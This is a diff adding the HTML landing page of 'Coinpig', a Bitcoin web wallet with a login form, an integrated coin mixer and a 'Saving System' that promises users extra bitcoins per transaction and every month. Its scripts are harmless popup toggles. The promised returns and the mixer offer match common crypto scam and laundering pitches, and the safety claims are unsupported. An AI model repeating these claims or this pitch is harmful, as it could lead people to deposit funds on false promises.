@@ -1,0 +1,223 @@
+
+<html>
+<head>
+    <title>Coinpig - Your Bitcoin Wallet with integrated Savings System</title>
+<meta charset="UTF-8">
+<meta name="description" content="Coinpig - Your bitcoin wallet with integrated savings system"/>
+<meta name="keywords" content="coinpig, coin, pig, bitcoin, btc, wallet, bitcoin client, payment system, eWallet, btc wallet, Cryptobank, Hybrid EWallet, bitcoin service, bitcoin wallet online, bitcoin address, bitcoin wallet address, bitcoin price"/>
+<meta name="author" content="Coinpig">
+<link rel="icon" type="image/png" href="favicon.png" />
+<link rel="stylesheet" type="text/css" href="css/style.css">
+<script src="js/jquerry.min.js"></script>
+<style>
+.error {
+position:absolute;
+width:100%;
+font-size:14pt;
+background: rgba( 241, 84, 84, 0.1);
+text-align:center;
+padding:5;
+color:#fff;
+}
+.app {
+background:#fbfbfb;
+width:100%;
+}
+.shadow {
+-webkit-box-shadow: 0px 10px 30px 0px rgba(50, 50, 50, 0.1);
+-moz-box-shadow:    0px 10px 30px 0px rgba(50, 50, 50, 0.1);
+box-shadow:         0px 10px 30px 0px rgba(50, 50, 50, 0.1);
+}
+</style>
+</head>
+<body><a name="top"></a>
+			<div class="header">
+		<a class="logo" href="index.php">
+	<span style="color:#d1757a">coin</span><span style="color:#600f09">pig</span>  <span style="color: #600f09; font-size:1.7vw; letter-spacing: -2px; position:absolute; margin-top:10px; left:0; right:0; text-align:center"></span>
+		</a><div style="float:right; color:#fff; font-weight:bold; font-size:12pt; margin-right:5%; margin-top:18px; letter-spacing:1px">1&#3647; = $64,340.49</div>
+			</div>
+						
+									 
+    <div class="head">
+					<div class="login-box" style="height:243px; margin-top: 41px">
+			<div class="log-box-head" style="font-size:1.3vw">Over 25000 people trust their Bitcoins with Coinpig!</div>
+							<div class="box-link" style="margin-bottom: 0">
+						<a class="box-link" href="javascript:PopUpShow()">Forgot password</a> |
+						<a class="box-link" href="javascript:PopUpShow2()">Create account</a>
+							</div>
+	<form method="post" action="">
+					<input style=";margin-top: 10px; height: 40px;" name="email" type="text" class="box-text" autocomplete="off">
+					<input style=";margin-top: 10px; height: 40px;" name="password" type="password" class="box-password" autocomplete="off">
+			<div align="center"><input name="submitBtn" type="submit" class="box-button" value="login"></div>	
+			</form></div>
+        
+ 
+							<div class="logo_head">
+			<div align="center"><a href="#info"><input class="read-button" type="button" value="read more." style="height: 32px; margin-top: 173px"></a>
+							</div>
+					</div>
+						
+<div class="wrap"><br />
+
+    <div class="pop_wrap">
+<div class="b-popup" id="popup1">
+    <div class="b-popup-content" style="margin-top:180px">
+<div class="pop-head">Forgot Password
+<a href="javascript:PopUpHide()"><img class="close_pop" src="images/close_pop.png" ></a>
+</div><br />
+<iframe scrolling="no" src="forgot.php" style="height:400px"></iframe>
+    </div>
+</div>
+<div class="cr-popup" id="popup2">
+    <div class="cr-popup-content">
+    <a href="javascript:PopUpHide2()"><img class="cr-close_pop" src="images/logout.png" ></a>
+<iframe src="registr.php"></iframe>
+    </div>
+</div></div></div><a name="info"></a>
+<div class="wrap2" >
+	<div><div align="center">
+		<h2 style="color:#600f09; font-size:2vw; margin-top: 41px;">
+			Coinpig is a Hybrid Bitcoin wallet with intergated Bitcoin Mixer and Saving System
+		</h2><br />
+		
+			<div style="width:25%; height:350px; margin-left:5%; position:absolute">
+				<img style="max-width:20%" src="images/hybrid1.png" width="100px"><br /><br />
+				<font style="color:#600f09; font-size:1.5vw; font-weight:bold">What is a hybrid wallet ?</font><br /><br />
+				<font style="font-size:0.9vw; color:#c5a5a5">
+				A hybrid wallet allows you to send and receive Bitcoins just<br />
+				like any other wallet. However, the Bitcoin private key which<br />
+				is required to send money is encrypted in your browser<br />
+				before it reaches our servers.<br /><br />
+				Therefore our servers only hold encrypted private keys and<br />
+				neither we nor anyone else can spend your Bitcoins. Only<br />
+				you.
+				</font>
+			</div>
+			<div align="center" style="width:30%; height:350px;">
+				<img style="max-width:20%" src="images/hybrid2.png" width="100px"><br /><br />
+				<font style="color:#600f09; font-size:1.5vw; font-weight:bold">Non-hybrid wallets are not safe.</font><br /><br />
+				<font style="font-size:0.9vw; color:#c5a5a5">
+				Even seemingly reputable wallet providers or exchanges<br />
+				that have access to your private keys are taking risks with<br />
+				your money.<br /><br />
+				It only takes one rogue employee or experienced hacker<br />
+				with access to the naked keys and your Bitcoins are gone<br />
+				forever.
+				</font>
+			</div>
+			<div style="width:25%; height:350px; position:absolute; margin-left:70%; margin-top:-350px">
+			<img style="max-width:20%" src="images/hybrid3.png" width="100px"><br /><br />
+				<font style="color:#600f09; font-size:1.5vw; font-weight:bold">What about desktop clients ?</font><br /><br />
+				<font style="font-size:0.9vw; color:#c5a5a5">
+				Even experienced Bitcoin users have lost coins because<br />
+				they accidently deleted their wallet file on their personal<br />
+				computers.<br /><br />
+				Coinpig takes care of offsite secure backups so you<br />
+				don't have to worry.
+				</font>
+		</div>
+	</div>
+	<table style="margin:0 auto; border:none; width: 70%;"><tr><td colspan="2"><h2 style="color:#600f09; font-size:2vw; margin-top: 0px;">
+			Bitcoin Mixer?
+		</h2></td></tr>
+<tr><td style="width:15%"><img src="images/time.png" style="width:50%"></td><td>
+<b style="color:#600f09; font-size:1vw">Mixing time:</b> <br />
+<font style="font-size:0.9vw; color:#c5a5a5">
+The entire Coinpig service is automated. This means that once your transaction has been sent and confirmed,<br /> the system selects a block of Bitcoin to forward to your destination address.<br /> The process should take no longer than 1 hour, however if your transaction takes longer than usual to confirm,<br /> it may be processed manually - this can take up to 24 hours.
+</font>
+</td></tr>
+<tr><td style="width:15%"><br /><img src="images/fees.png" style="width:50%"></td><td>
+<b style="color:#600f09; font-size:1vw">Our Fees:</b><br />
+<font style="font-size:0.9vw; color:#c5a5a5">
+
+Use of the Coinpig service has the following fees:<br />
+
+0.5% of the total Bitcoin amount, and<br />
+0.0001 BTC flat fee per transaction
+</font>
+</td></tr>
+<tr><td style="width:15%"><br /><img src="images/finally.png" style="width:50%"></td><td>
+<b style="color:#600f09; font-size:1vw">Finally:</b><br />
+<font style="font-size:0.9vw; color:#c5a5a5">
+You can sit back and relax while your Bitcoins are safely mixed.<br />
+If you have any questions or concerns, feel free to contact us.
+</font>
+</td>
+</tr>
+</table>
+	
+	<div align="center" style="background-color:#fbfbfb">
+		<h2 style="color:#600f09; font-size:2.2vw; padding-top:2%">
+			What does "Saving System" mean?
+		</h2>
+		<div align="center" style="color:#c5a5a5; font-size:1.8vw">It means that you receive extra bitcoins for keeping them on Coinpig</div>
+			<div>
+				<img style="width:40%; float:left; margin-left:10%; margin-top:5%" src="images/savings_plan.png">
+			</div>
+			<div style="height:25%; padding-top:10%">
+					<div style="color:c5a5a5; font-size:1.5vw">
+						You receive 1% for each transaction<br />
+						and<br />
+						extra percents every month
+					</div>
+					<div style="color:c5a5a5; font-size:1.5vw; padding-top:5%">
+						<b>Your monthly percent<br />
+						depends on your balance</b>
+					</div>
+			</div>
+			<br /><br /><br /><br />
+	<div>
+	</div>
+</div>
+</div></div>
+<br clear="all"/>
+<div align="center"><img class="shadow" width="40%" src="images/transactions_info.png"></div>
+<div style="width:60%"><img style="width:100%;max-width:100%;" src="images/demo.png"></div>
+
+<div align="center" style="width:30%; height:30%; position:absolute; margin-top:-30%; margin-left:63%">
+<h3 style="font-size:2.1vw;">INTERESTED?</h3>
+<h3 style="font-size:1.2vw;">Sign up and Use for Free now!</h3>
+<div><a href="#top" onclick="PopUpShow2()"><input style="font-size:1.2vw;height:40px" class="box-button" type="button" value="sign up"></a></div>
+</div><div class="footer">
+<a class="footer" href="index.php">CoinPig &copy; 2024 All Rights Reserved</a>
+</div>
+
+<script>
+;(function($){
+   $(document).on('click', 'a[href^=#]', function () {
+        $('html, body').animate({ scrollTop:  $('a[name="'+this.hash.slice(1)+'"]').offset().top }, 1000 ); 
+        return false;
+    });
+})(jQuery);
+</script>
+<script>
+    $(document).ready(function(){
+          
+        PopUpHide();
+    });
+    
+    function PopUpShow(){
+        $("#popup1").show();
+    }
+    
+    function PopUpHide(){
+        $("#popup1").hide();
+    }
+</script>
+<script>
+    $(document).ready(function(){
+           
+        PopUpHide2();
+    });
+    
+    function PopUpShow2(){
+        $("#popup2").show();
+    }
+    
+    function PopUpHide2(){
+        $("#popup2").hide();
+    }
+</script>
+			
+</body>
+</html>
